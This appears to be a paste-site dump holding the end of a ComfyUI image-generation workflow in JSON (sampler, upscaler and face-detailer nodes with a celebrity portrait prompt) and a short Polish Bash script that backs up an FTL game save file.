      ""widgets_values"": [
        -2
      ]
    },
    {
      ""id"": 76,
      ""type"": ""CLIPTextEncode"",
      ""pos"": [
        -283,
        1077
      ],
      ""size"": {
        ""0"": 264.1236267089844,
        ""1"": 76.23077392578125
      },
      ""flags"": {},
      ""order"": 12,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""clip"",
          ""type"": ""CLIP"",
          ""link"": 186
        }
      ],
      ""outputs"": [
        {
          ""name"": ""CONDITIONING"",
          ""type"": ""CONDITIONING"",
          ""links"": [
            196
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""CLIPTextEncode""
      },
      ""widgets_values"": [
        ""ugly, featureless""
      ],
      ""color"": ""#232""
    },
    {
      ""id"": 75,
      ""type"": ""CLIPTextEncode"",
      ""pos"": [
        -279,
        955
      ],
      ""size"": {
        ""0"": 264.1236267089844,
        ""1"": 76.23077392578125
      },
      ""flags"": {},
      ""order"": 11,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""clip"",
          ""type"": ""CLIP"",
          ""link"": 185
        }
      ],
      ""outputs"": [
        {
          ""name"": ""CONDITIONING"",
          ""type"": ""CONDITIONING"",
          ""links"": [
            195
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""CLIPTextEncode""
      },
      ""widgets_values"": [
        ""the most detailed image in the world""
      ],
      ""color"": ""#232""
    },
    {
      ""id"": 3,
      ""type"": ""KSampler"",
      ""pos"": [
        521,
        269
      ],
      ""size"": [
        315,
        474
      ],
      ""flags"": {},
      ""order"": 13,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""model"",
          ""type"": ""MODEL"",
          ""link"": 119,
          ""slot_index"": 0
        },
        {
          ""name"": ""positive"",
          ""type"": ""CONDITIONING"",
          ""link"": 107
        },
        {
          ""name"": ""negative"",
          ""type"": ""CONDITIONING"",
          ""link"": 108
        },
        {
          ""name"": ""latent_image"",
          ""type"": ""LATENT"",
          ""link"": 82
        }
      ],
      ""outputs"": [
        {
          ""name"": ""LATENT"",
          ""type"": ""LATENT"",
          ""links"": [
            88
          ],
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""KSampler""
      },
      ""widgets_values"": [
        1055126645302201,
        ""fixed"",
        29,
        4.9,
        ""lcm"",
        ""exponential"",
        0.89
      ],
      ""color"": ""#232""
    },
    {
      ""id"": 53,
      ""type"": ""Constant Number"",
      ""pos"": [
        -1080,
        277
      ],
      ""size"": {
        ""0"": 315,
        ""1"": 146
      },
      ""flags"": {},
      ""order"": 4,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""number_as_text"",
          ""type"": ""STRING"",
          ""link"": null,
          ""widget"": {
            ""name"": ""number_as_text""
          }
        }
      ],
      ""outputs"": [
        {
          ""name"": ""NUMBER"",
          ""type"": ""NUMBER"",
          ""links"": null,
          ""shape"": 3
        },
        {
          ""name"": ""FLOAT"",
          ""type"": ""FLOAT"",
          ""links"": null,
          ""shape"": 3
        },
        {
          ""name"": ""INT"",
          ""type"": ""INT"",
          ""links"": [
            121
          ],
          ""shape"": 3,
          ""slot_index"": 2
        }
      ],
      ""title"": ""Width"",
      ""properties"": {
        ""Node name for S&R"": ""Constant Number""
      },
      ""widgets_values"": [
        ""integer"",
        2048,
        """"
      ],
      ""color"": ""#232"",
      ""bgcolor"": ""#353""
    },
    {
      ""id"": 52,
      ""type"": ""Constant Number"",
      ""pos"": [
        -1072,
        501
      ],
      ""size"": {
        ""0"": 315,
        ""1"": 146
      },
      ""flags"": {},
      ""order"": 5,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""number_as_text"",
          ""type"": ""STRING"",
          ""link"": null,
          ""widget"": {
            ""name"": ""number_as_text""
          }
        }
      ],
      ""outputs"": [
        {
          ""name"": ""NUMBER"",
          ""type"": ""NUMBER"",
          ""links"": null,
          ""shape"": 3
        },
        {
          ""name"": ""FLOAT"",
          ""type"": ""FLOAT"",
          ""links"": null,
          ""shape"": 3
        },
        {
          ""name"": ""INT"",
          ""type"": ""INT"",
          ""links"": [
            122
          ],
          ""shape"": 3,
          ""slot_index"": 2
        }
      ],
      ""title"": ""Height"",
      ""properties"": {
        ""Node name for S&R"": ""Constant Number""
      },
      ""widgets_values"": [
        ""integer"",
        2560,
        """"
      ],
      ""color"": ""#232"",
      ""bgcolor"": ""#353""
    },
    {
      ""id"": 81,
      ""type"": ""UltimateSDUpscale"",
      ""pos"": [
        236,
        757
      ],
      ""size"": {
        ""0"": 315,
        ""1"": 826
      },
      ""flags"": {},
      ""order"": 19,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""image"",
          ""type"": ""IMAGE"",
          ""link"": 193
        },
        {
          ""name"": ""model"",
          ""type"": ""MODEL"",
          ""link"": 198
        },
        {
          ""name"": ""positive"",
          ""type"": ""CONDITIONING"",
          ""link"": 195
        },
        {
          ""name"": ""negative"",
          ""type"": ""CONDITIONING"",
          ""link"": 196
        },
        {
          ""name"": ""vae"",
          ""type"": ""VAE"",
          ""link"": 197
        },
        {
          ""name"": ""upscale_model"",
          ""type"": ""UPSCALE_MODEL"",
          ""link"": 194,
          ""slot_index"": 5
        }
      ],
      ""outputs"": [
        {
          ""name"": ""IMAGE"",
          ""type"": ""IMAGE"",
          ""links"": [
            224
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""UltimateSDUpscale""
      },
      ""widgets_values"": [
        2,
        25587868329102,
        ""fixed"",
        19,
        7.1000000000000005,
        ""ddim"",
        ""exponential"",
        0.35000000000000003,
        ""Linear"",
        1024,
        1024,
        8,
        32,
        ""None"",
        1,
        64,
        8,
        16,
        true,
        false
      ],
      ""color"": ""#232""
    },
    {
      ""id"": 88,
      ""type"": ""SDXLPromptStyler"",
      ""pos"": [
        -342,
        366
      ],
      ""size"": {
        ""0"": 448.6899719238281,
        ""1"": 298.5990905761719
      },
      ""flags"": {},
      ""order"": 6,
      ""mode"": 0,
      ""outputs"": [
        {
          ""name"": ""text_positive"",
          ""type"": ""STRING"",
          ""links"": [
            212
          ],
          ""shape"": 3,
          ""slot_index"": 0
        },
        {
          ""name"": ""text_negative"",
          ""type"": ""STRING"",
          ""links"": [
            213
          ],
          ""shape"": 3,
          ""slot_index"": 1
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""SDXLPromptStyler""
      },
      ""widgets_values"": [
        ""a beautiful portrait photography of Cara Delevingne"",
        ""text, watermark"",
        ""sai-enhance"",
        true,
        true,
        true
      ],
      ""color"": ""#232"",
      ""bgcolor"": ""#353""
    },
    {
      ""id"": 58,
      ""type"": ""Image scale by ratio"",
      ""pos"": [
        -1070,
        754
      ],
      ""size"": {
        ""0"": 315,
        ""1"": 106
      },
      ""flags"": {},
      ""order"": 17,
      ""mode"": 0,
      ""inputs"": [
        {
          ""name"": ""image"",
          ""type"": ""IMAGE"",
          ""link"": 130
        }
      ],
      ""outputs"": [
        {
          ""name"": ""IMAGE"",
          ""type"": ""IMAGE"",
          ""links"": [
            193
          ],
          ""shape"": 3,
          ""slot_index"": 0
        }
      ],
      ""properties"": {
        ""Node name for S&R"": ""Image scale by ratio""
      },
      ""widgets_values"": [
        0.5,
        ""nearest-exact"",
        ""disabled""
      ]
    }
  ],
  ""links"": [
    [
      82,
      34,
      0,
      3,
      3,
      ""LATENT""
    ],
    [
      83,
      34,
      1,
      33,
      3,
      ""LATENT""
    ],
    [
      86,
      36,
      0,
      33,
      1,
      ""CONDITIONING""
    ],
    [
      88,
      3,
      0,
      36,
      1,
      ""LATENT""
    ],
    [
      98,
      33,
      0,
      8,
      0,
      ""LATENT""
    ],
    [
      107,
      6,
      0,
      3,
      1,
      ""CONDITIONING""
    ],
    [
      108,
      7,
      0,
      3,
      2,
      ""CONDITIONING""
    ],
    [
      111,
      41,
      1,
      6,
      0,
      ""CLIP""
    ],
    [
      112,
      41,
      1,
      7,
      0,
      ""CLIP""
    ],
    [
      113,
      42,
      0,
      33,
      0,
      ""MODEL""
    ],
    [
      114,
      42,
      2,
      8,
      1,
      ""VAE""
    ],
    [
      116,
      6,
      0,
      36,
      0,
      ""CONDITIONING""
    ],
    [
      117,
      7,
      0,
      33,
      2,
      ""CONDITIONING""
    ],
    [
      119,
      41,
      0,
      3,
      0,
      ""MODEL""
    ],
    [
      121,
      53,
      2,
      34,
      0,
      ""INT""
    ],
    [
      122,
      52,
      2,
      34,
      1,
      ""INT""
    ],
    [
      130,
      8,
      0,
      58,
      0,
      ""IMAGE""
    ],
    [
      181,
      8,
      0,
      78,
      0,
      ""IMAGE""
    ],
    [
      184,
      74,
      1,
      80,
      0,
      ""CLIP""
    ],
    [
      185,
      80,
      0,
      75,
      0,
      ""CLIP""
    ],
    [
      186,
      80,
      0,
      76,
      0,
      ""CLIP""
    ],
    [
      193,
      58,
      0,
      81,
      0,
      ""IMAGE""
    ],
    [
      194,
      82,
      0,
      81,
      5,
      ""UPSCALE_MODEL""
    ],
    [
      195,
      75,
      0,
      81,
      2,
      ""CONDITIONING""
    ],
    [
      196,
      76,
      0,
      81,
      3,
      ""CONDITIONING""
    ],
    [
      197,
      74,
      2,
      81,
      4,
      ""VAE""
    ],
    [
      198,
      74,
      0,
      81,
      1,
      ""MODEL""
    ],
    [
      200,
      56,
      0,
      79,
      0,
      ""IMAGE""
    ],
    [
      211,
      56,
      0,
      85,
      0,
      ""*""
    ],
    [
      212,
      88,
      0,
      6,
      1,
      ""STRING""
    ],
    [
      213,
      88,
      1,
      7,
      1,
      ""STRING""
    ],
    [
      224,
      81,
      0,
      56,
      0,
      ""IMAGE""
    ]
  ],
  ""groups"": [
    {
      ""title"": ""Stage B"",
      ""bounding"": [
        881,
        184,
        1362,
        489
      ],
      ""color"": ""#8A8"",
      ""font_size"": 24,
      ""locked"": false
    },
    {
      ""title"": ""Stage C"",
      ""bounding"": [
        -1113,
        184,
        1991,
        490
      ],
      ""color"": ""#b06634"",
      ""font_size"": 24,
      ""locked"": false
    },
    {
      ""title"": ""Upscaling"",
      ""bounding"": [
        -1115,
        683,
        3379,
        1264
      ],
      ""color"": ""#3f789e"",
      ""font_size"": 24,
      ""locked"": false
    }
  ],
  ""config"": {},
  ""extra"": {
    ""groupNodes"": {
      ""face_detailer::face_detailer"": {
        ""author"": ""Mikerhinos"",
        ""category"": ""util"",
        ""datetime"": 1708453757680,
        ""external"": [
          [
            2,
            0,
            ""IMAGE""
          ]
        ],
        ""links"": [
          [
            null,
            5,
            2,
            0,
            120,
            ""IMAGE""
          ],
          [
            null,
            0,
            2,
            1,
            121,
            ""MODEL""
          ],
          [
            null,
            1,
            2,
            2,
            121,
            ""CLIP""
          ],
          [
            null,
            2,
            2,
            3,
            121,
            ""VAE""
          ],
          [
            null,
            0,
            2,
            4,
            109,
            ""CONDITIONING""
          ],
          [
            null,
            0,
            2,
            5,
            110,
            ""CONDITIONING""
          ],
          [
            0,
            0,
            2,
            6,
            75,
            ""BBOX_DETECTOR""
          ],
          [
            1,
            0,
            2,
            7,
            76,
            ""SAM_MODEL""
          ],
          [
            2,
            2,
            3,
            0,
            77,
            ""IMAGE""
          ]
        ],
        ""nodes"": [
          {
            ""bgcolor"": ""#535"",
            ""color"": ""#323"",
            ""flags"": {},
            ""index"": 0,
            ""mode"": 0,
            ""order"": 8,
            ""outputs"": [
              {
                ""links"": [],
                ""name"": ""BBOX_DETECTOR"",
                ""shape"": 3,
                ""slot_index"": 0,
                ""type"": ""BBOX_DETECTOR""
              },
              {
                ""links"": null,
                ""name"": ""SEGM_DETECTOR"",
                ""shape"": 3,
                ""slot_index"": 1,
                ""type"": ""SEGM_DETECTOR""
              }
            ],
            ""pos"": [
              1810,
              1640
            ],
            ""properties"": {
              ""Node name for S&R"": ""UltralyticsDetectorProvider""
            },
            ""size"": {
              ""0"": 315,
              ""1"": 78
            },
            ""type"": ""UltralyticsDetectorProvider"",
            ""widgets_values"": [
              ""bbox/face_yolov8m.pt""
            ]
          },
          {
            ""bgcolor"": ""#535"",
            ""color"": ""#323"",
            ""flags"": {},
            ""index"": 1,
            ""mode"": 0,
            ""order"": 9,
            ""outputs"": [
              {
                ""links"": [],
                ""name"": ""SAM_MODEL"",
                ""shape"": 3,
                ""slot_index"": 0,
                ""type"": ""SAM_MODEL""
              }
            ],
            ""pos"": [
              1810,
              1770
            ],
            ""properties"": {
              ""Node name for S&R"": ""SAMLoader""
            },
            ""size"": {
              ""0"": 315,
              ""1"": 82
            },
            ""type"": ""SAMLoader"",
            ""widgets_values"": [
              ""sam_vit_b_01ec64.pth"",
              ""AUTO""
            ]
          },
          {
            ""bgcolor"": ""#535"",
            ""color"": ""#323"",
            ""flags"": {},
            ""index"": 2,
            ""inputs"": [
              {
                ""link"": null,
                ""name"": ""image"",
                ""slot_index"": 0,
                ""type"": ""IMAGE""
              },
              {
                ""link"": null,
                ""name"": ""model"",
                ""type"": ""MODEL""
              },
              {
                ""link"": null,
                ""name"": ""clip"",
                ""slot_index"": 2,
                ""type"": ""CLIP""
              },
              {
                ""link"": null,
                ""name"": ""vae"",
                ""type"": ""VAE""
              },
              {
                ""link"": null,
                ""name"": ""positive"",
                ""type"": ""CONDITIONING""
              },
              {
                ""link"": null,
                ""name"": ""negative"",
                ""type"": ""CONDITIONING""
              },
              {
                ""link"": null,
                ""name"": ""bbox_detector"",
                ""type"": ""BBOX_DETECTOR""
              },
              {
                ""link"": null,
                ""name"": ""sam_model_opt"",
                ""type"": ""SAM_MODEL""
              },
              {
                ""link"": null,
                ""name"": ""segm_detector_opt"",
                ""type"": ""SEGM_DETECTOR""
              },
              {
                ""link"": null,
                ""name"": ""detailer_hook"",
                ""type"": ""DETAILER_HOOK""
              }
            ],
            ""mode"": 0,
            ""order"": 14,
            ""outputs"": [
              {
                ""links"": [],
                ""name"": ""image"",
                ""shape"": 3,
                ""slot_index"": 0,
                ""type"": ""IMAGE""
              },
              {
                ""links"": null,
                ""name"": ""cropped_refined"",
                ""shape"": 6,
                ""type"": ""IMAGE""
              },
              {
                ""links"": [],
                ""name"": ""cropped_enhanced_alpha"",
                ""shape"": 6,
                ""slot_index"": 2,
                ""type"": ""IMAGE""
              },
              {
                ""links"": null,
                ""name"": ""mask"",
                ""shape"": 3,
                ""type"": ""MASK""
              },
              {
                ""links"": [],
                ""name"": ""detailer_pipe"",
                ""shape"": 3,
                ""slot_index"": 4,
                ""type"": ""DETAILER_PIPE""
              },
              {
                ""links"": null,
                ""name"": ""cnet_images"",
                ""shape"": 6,
                ""type"": ""IMAGE""
              }
            ],
            ""pos"": [
              1820,
              670
            ],
            ""properties"": {
              ""Node name for S&R"": ""FaceDetailer""
            },
            ""size"": {
              ""0"": 516.2901000976562,
              ""1"": 912.445556640625
            },
            ""title"": ""Face Detailer"",
            ""type"": ""FaceDetailer"",
            ""widgets_values"": [
              768,
              true,
              1024,
              1432850182,
              ""randomize"",
              30,
              5,
              ""dpmpp_2m"",
              ""karras"",
              0.36,
              10,
              false,
              true,
              0.8,
              10,
              3,
              ""center-1"",
              6,
              0.75,
              10,
              0.9,
              ""False"",
              10,
              """",
              1,
              false,
              10
            ]
          },
          {
            ""bgcolor"": ""#000"",
            ""color"": ""#222"",
            ""flags"": {},
            ""index"": 3,
            ""inputs"": [
              {
                ""link"": null,
                ""name"": ""images"",
                ""type"": ""IMAGE""
              }
            ],
            ""mode"": 0,
            ""order"": 16,
            ""pos"": [
              2130,
              1630
            ],
            ""properties"": {
              ""Node name for S&R"": ""PreviewImage""
            },
            ""size"": {
              ""0"": 213.09561157226562,
              ""1"": 246
            },
            ""type"": ""PreviewImage""
          }
        ],
        ""packname"": """",
        ""version"": ""0.0""
      }
    }
  },
  ""version"": 0.4
}"
Bdt2rqmp,backup_continue.sav.sh,FranzVuttke,Bash,Saturday 24th of February 2024 05:18:51 PM CDT,"#/bin/bash


#
# createed by OuNiS 02.2024
#
# FTL - tworzenie kopii zapasowej pliku 'continue.sav'
#

ANSW_CONFIRM=""t""
FILE_2_ROLLBACK=""continue.sav""
BACKUP_FILE=""continue.backup""
# kolory textu
# zestaw kodów kolorów:
# https://pastebin.com/iXJ8umhX
F_COLOR_TXT_DEF='\e[0m'
F_COLOR_TXT_RED='\e[31m'
F_COLOR_TXT_BLINK='\e[5m'
F_COLOR_TXT_BLUE='\e[34m'




echo
echo -e ""FTL - tworzenie kopii pliku $F_COLOR_TXT_BLUE'$FILE_2_ROLLBACK'$F_COLOR_TXT_DEF""

# dodatkowo: parametr jako plik backupu inny niż domyślny
if test $# -eq 1; then
	echo -e ""*** Podano nazwę pliku do backupu: $F_COLOR_TXT_BLUE$1 $F_COLOR_TXT_DEF""
	BACKUP_FILE=$1
fi

# echo ""Nowa nazwa pliku kopii: $BACKUP_FILE""

if test -e $BACKUP_FILE; then
	echo -e ""UWAGA, Plik $F_COLOR_TXT_RED'$BACKUP_FILE'$F_COLOR_TXT_DEF kopii zapasowej istnieje!!!""
	echo -n ""Nadpisać istniejącą kopię(t/n)? ""
	read answ
# 	if test -z $answ; then
# 		answ=""T""
# 	fi
	if test $answ = $ANSW_CONFIRM; then
		echo ""ODPOWIEDŹ: $answ - ZGODA WYRAŻONA!!! - KOPIOWANIE...""
		cp $FILE_2_ROLLBACK $BACKUP_FILE
	else
		echo -e ""Tworzenie kopii zapasowej pliku '$FILE_2_ROLLBACK' $F_COLOR_TXT_RED ANULOWANE...$F_COLOR_TXT_DEF""
	fi
else
 	echo -e 'plik nie istnieje KOPIOWANIE...'
    cp $FILE_2_ROLLBACK $BACKUP_FILE
fi

"
